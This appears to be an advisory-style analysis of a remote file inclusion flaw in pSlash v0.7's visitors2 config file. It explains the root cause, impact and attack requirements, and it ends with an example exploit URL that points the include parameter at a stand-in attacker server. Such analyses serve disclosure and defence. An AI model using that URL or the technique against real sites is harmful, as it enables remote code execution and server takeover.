Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**

*   The vulnerability stems from the `lvc_include_dir` variable within the `modules/visitors2/include/config.inc.php` file of pSlash v0.7. This variable is used in include and require statements without proper sanitization. Specifically, the code uses:
    *   `include($lvc_include_dir.'lang/english.inc.php');`
    *  `require($lvc_include_dir.'db/db_mysql.inc.php');`
*  The lack of input validation on the `lvc_include_dir` parameter allows an attacker to manipulate it and include remote files.

**Weaknesses/Vulnerabilities:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is RFI. The application blindly includes files based on the user-controlled `lvc_include_dir` parameter.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary code on the vulnerable server. This can lead to complete compromise of the system.
*   **Data Breach:**  The attacker can potentially gain access to sensitive information stored on the server or within the database.
*   **Website Defacement:** An attacker could modify the website's appearance or redirect users to malicious sites.
*   **Malware Distribution:** The server could be used to distribute malware to visitors.

**Attack Vectors:**

*   **HTTP GET Request:** The `lvc_include_dir` parameter is passed through a GET request, making it easily accessible and modifiable via the URL.

**Required Attacker Capabilities/Position:**

*   **Remote Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
*   **Web Server Accessibility:** The vulnerable `config.inc.php` file must be accessible through a web browser.
*   **Malicious Server:** The attacker needs a web server to host the malicious script that will be included.
*   **Basic Understanding of Web Application Vulnerabilities**

**Technical Details:**

*   The vulnerable code snippet is located in `/modules/visitors2/include/config.inc.php`.
*   The exploit involves setting the `lvc_include_dir` parameter in the URL to a malicious script hosted on a remote server.

**Example Exploit URL:**

```
http://www.site.com/[path]/modules/visitors2/include/config.inc.php?lvc_include_dir=http://evil_scripts?
```
Where:
* `http://www.site.com/[path]` represents the path to the vulnerable pSlash application.
* `http://evil_scripts` points to the attacker's web server where malicious PHP code is hosted.
